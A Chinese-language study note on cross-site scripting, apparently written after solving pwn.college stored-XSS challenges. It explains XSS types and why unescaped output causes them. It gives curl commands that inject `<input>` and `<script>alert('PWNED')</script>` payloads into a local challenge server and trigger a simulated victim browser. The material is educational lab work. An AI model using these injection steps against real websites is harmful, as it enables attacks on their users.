---
aliases:
tags:
  - CTF
date: 2026-04-14
gloss:
---
## 1. 什么是 XSS

XSS 全称是 **Cross-Site Scripting**，中文叫 **跨站脚本攻击**。

它的本质是：

**攻击者把恶意脚本代码注入到网页中，当其他用户打开这个网页时，脚本就在受害者的浏览器里执行。**

这里要特别注意：

- 以前学的路径遍历、命令注入、SQL 注入，受害者通常是服务器
- **XSS 的受害者是浏览器里的用户**

也就是说，XSS 攻击的目标不是直接攻击服务器，而是让服务器生成“带毒”的网页，再让别人浏览这个网页。

---

## 2. XSS 为什么会出现

XSS 出现的根本原因是：

**网站把用户提交的数据当成 HTML 代码输出了，而不是当成普通文本显示。**

例如，程序把用户输入直接拼进页面：

```html
<hr>用户输入内容
```

如果用户输入的是：

```html
<script>alert("PWNED")</script>
```

浏览器就不会把它当成普通文字，而会把它当成真正的 JavaScript 执行。

---

## 3. XSS 的核心危害

XSS 的危害不只是弹窗，真正危险的是它可以在受害者浏览器里做很多事，例如：

- 弹出伪造提示框
    
- 修改页面内容
    
- 窃取页面信息
    
- 冒充当前用户发请求
    
- 读取受害者能看到的数据
    
- 将敏感信息发送到攻击者控制的位置
    

所以弹窗只是“证明代码执行成功”的最基础形式。

---

## 4. XSS 常见类型

### 4.1 反射型 XSS

恶意代码来自当前请求，服务器立刻把它返回到页面里。

特点是：

- 一般不存数据库
    
- 通常依赖用户点击恶意链接
    

### 4.2 存储型 XSS

恶意代码先被保存到服务器或数据库里，后续其他用户访问页面时触发。

特点是：

- 危害更大
    
- 不需要受害者点击特定链接，只要打开页面就可能中招
    

你在 pwn.college 做的这些题，主要就是 **Stored XSS（存储型 XSS）**。

### 4.3 DOM 型 XSS

漏洞主要在前端 JavaScript 处理页面内容时产生，不一定经过服务器拼接。

---

## 5. 你前面题目里的 XSS 本质

在你做的题里，核心代码是这样的：

```python
for post in db.execute("SELECT content FROM posts").fetchall():
    page += "<hr>" + post["content"] + "\n"
```

问题在于：

- 用户提交的 `content` 会被存入数据库
    
- 页面显示帖子时，直接把 `content` 原样拼进 HTML
    
- 没有进行转义、过滤或安全处理
    

因此用户提交的不是普通帖子，而是：

- HTML 标签
    
- `<input>`
    
- `<script>`
    
- 任意浏览器可解析的内容
    

这就形成了 **存储型 XSS**。

---

## 6. XSS-1：注入 HTML 的思路

在最初那一关里，题目要求的是：

**只要让 victim 页面中出现三个文本框，就给 flag。**

页面原本已经有一个文本框：

```html
<form method=post>Post:<input type=text name=content><input type=submit value=Submit></form>
```

所以只需要再注入两个文本框：

```html
<input type=text><input type=text>
```

终端里提交：

```bash
curl -X POST http://challenge.localhost \
  --data-urlencode 'content=<input type=text><input type=text>'
```

然后让 victim 访问页面：

```bash
/challenge/victim http://challenge.localhost
```

victim 看到总共三个文本框，就会给 flag。

### 这一关学到的点

- XSS 不一定非得执行 JavaScript
    
- **能注入 HTML 本身就是 XSS 的开始**
    
- 浏览器会把你插入的标签当成页面的一部分解析
    

---

## 7. XSS-2：执行 JavaScript 的思路

下一关要求：

**让受害者浏览器执行 `alert("PWNED")`**

这时 payload 就从 HTML 变成 JavaScript：

```html
<script>alert("PWNED")</script>
```

终端提交：

```bash
curl -X POST http://challenge.localhost \
  --data-urlencode 'content=<script>alert("PWNED")</script>'
```

查看页面内容：

```bash
curl http://challenge.localhost
```

你会看到：

```html
<hr><script>alert("PWNED")</script>
```

这说明脚本已经成功存入页面。

接着让 victim 访问：

```bash
/challenge/victim
```

或者某些关卡要指定 URL：

```bash
/challenge/victim http://challenge.localhost
```

当 victim 浏览器真正打开页面时，就会执行 `alert("PWNED")`，题目会输出 flag。

### 这一关学到的点

- `curl` 只能看到源码，**不会执行 JavaScript**
    
- 真正执行 JavaScript 的是浏览器
    
- 在 pwn.college 里，很多 XSS 题目的“受害者”不是你自己，而是 `/challenge/victim`
    

---

## 8. 为什么自己看到弹窗却不一定得分

这是新手最容易困惑的地方。

你自己用 Firefox 打开页面，看到弹窗，只能说明：

- payload 注入成功
    
- 浏览器确实会执行它
    

但很多题目真正的判题条件是：

**不是你看到了弹窗，而是 victim 浏览器看到了弹窗。**

所以流程应该是：

1. 用 `curl` 把 payload 注入页面
    
2. 用 `curl` 检查页面里是否真的出现 payload
    
3. 调用 `/challenge/victim`
    
4. 等 victim 浏览器访问并触发 payload
    
5. 在终端中拿到 flag
    

---

## 9. `/challenge/victim` 是做什么的

在 pwn.college 的 XSS 题里，`/challenge/victim` 是一个模拟受害者浏览器的程序。

它的作用就是：

- 打开题目页面
    
- 像真实用户一样加载 HTML
    
- 执行 JavaScript
    
- 检查你是否达成目标
    
- 成功后输出 flag
    

你后来拿到的输出：

```text
Alert triggered! Your reward:
pwn.college{...}
```

就说明：

- victim 成功访问了页面
    
- `alert("PWNED")` 成功执行
    
- 题目判定通过
    

---

## 10. `curl` 和浏览器的区别

### `curl` 能做什么

- 发 GET / POST 请求
    
- 提交 payload
    
- 查看页面源码
    
- 调试服务器返回内容
    

### `curl` 不能做什么

- 不能解析 HTML 为真实页面
    
- 不能执行 JavaScript
    
- 不能弹出 alert
    
- 不能模拟完整浏览器行为
    

所以可以记成一句话：

**curl 负责“注入”，浏览器负责“执行”。**

---

## 11. XSS 做题常见通用流程

遇到一题 XSS，通常可以按这个顺序操作。

### 第一步：看源码

先看 `/challenge/server`：

```bash
sed -n '1,220p' /challenge/server
```

重点找：

- 用户输入在哪里接收
    
- 用户输入是否进入数据库
    
- 输出页面时是否原样拼接
    
- 是否做了 HTML 转义
    

如果看到类似：

```python
page += post["content"]
```

那就很危险。

---

### 第二步：构造 payload

根据题目目标构造不同 payload：

- 注入 HTML 元素：
    

```html
<input type=text>
```

- 执行 JavaScript：
    

```html
<script>alert("PWNED")</script>
```

---

### 第三步：提交 payload

```bash
curl -X POST http://challenge.localhost \
  --data-urlencode 'content=<script>alert("PWNED")</script>'
```

---

### 第四步：检查是否存入页面

```bash
curl http://challenge.localhost
```

确认页面源码里出现了你的 payload。

---

### 第五步：触发 victim

```bash
/challenge/victim
```

或者：

```bash
/challenge/victim http://challenge.localhost
```

---

### 第六步：查看结果

如果 payload 在 victim 浏览器中成功执行，通常终端会给出 flag。

---

## 12. XSS 调试方法

题目里也特别强调了调试，这很重要。

### 12.1 看页面源码

先确认你注入后的页面是不是合法 HTML：

```bash
curl http://challenge.localhost
```

或者在浏览器里用 View Source / Inspect Element。

如果 HTML 结构被你破坏了，浏览器可能不会按预期解析。

---

### 12.2 检查脚本本身是否有错

如果 `<script>` 已经插进页面，但没有效果，可能是 JavaScript 写错了。

这时应该看浏览器控制台报错信息。

也可以用：

```javascript
console.log("test")
```

来辅助调试。

---

### 12.3 区分“注入成功”和“执行成功”

这两者不是一回事。

- 页面里出现 `<script>...</script>`：说明注入成功
    
- 浏览器真的运行了脚本：说明执行成功
    

---

## 13. 新手最容易犯的错误

### 错误 1：以为 `curl` 会执行 JavaScript

不会。`curl` 只显示源码。

### 错误 2：自己浏览器弹窗了，以为题目一定过了

不一定。很多关要求的是 victim 触发。

### 错误 3：注入后不检查源码

有时 payload 被截断、转义或破坏，不检查很难发现问题。

### 错误 4：HTML 写坏导致页面结构异常

XSS payload 不仅要“恶意”，还要“能被浏览器正确解析”。

---

## 14. 这几关你实际掌握了什么

通过前面的题，你已经接触到了 XSS 的几个最核心概念：

### 14.1 用户输入进入 HTML 输出会导致 XSS

如果网站把用户内容原样拼进 HTML，就可能出问题。

### 14.2 HTML 注入和 JavaScript 注入是递进关系

先能插入标签，再能插入脚本。

### 14.3 Stored XSS 的关键在于“别人会看到你存进去的内容”

你注入后，不一定立刻触发；等 victim 查看页面时才触发。

### 14.4 victim 才是判题核心

在 pwn.college 的 XSS 场景里，真正重要的是：  
**让 `/challenge/victim` 去访问带有 payload 的页面。**

---

## 15. 一份最简明的做题模板

以后遇到类似题，可以直接套这套流程：

### 查看源码

```bash
sed -n '1,220p' /challenge/server
```

### 提交 payload

```bash
curl -X POST http://challenge.localhost \
  --data-urlencode 'content=<script>alert("PWNED")</script>'
```

### 查看页面源码

```bash
curl http://challenge.localhost
```

### 触发 victim

```bash
/challenge/victim
```

---

## 16. 一句话总结

**XSS 就是把用户输入变成浏览器会执行的内容。**

在你做的这些题里：

- 服务端把帖子内容原样输出到 HTML
    
- 攻击者可以提交恶意 HTML 或 JavaScript
    
- 这些内容会在 victim 浏览器中被解析和执行
    
- 从而达成题目目标并拿到 flag
    

---

## 17. 适合记忆的超简版总结

### XSS 是什么

把恶意脚本注入网页，让受害者浏览器执行。

### 为什么会发生

服务器把用户输入当成 HTML 输出，没有转义。

### 存储型 XSS 是什么

恶意内容先存数据库，别人访问页面时触发。

### `curl` 能干什么

提交 payload、看源码。

### `curl` 不能干什么

不能执行 JavaScript。

### 谁来执行脚本

浏览器，或者题目里的 `/challenge/victim`。

### 做题关键步骤

看源码 → 注入 payload → 检查页面 → 触发 victim → 拿 flag。
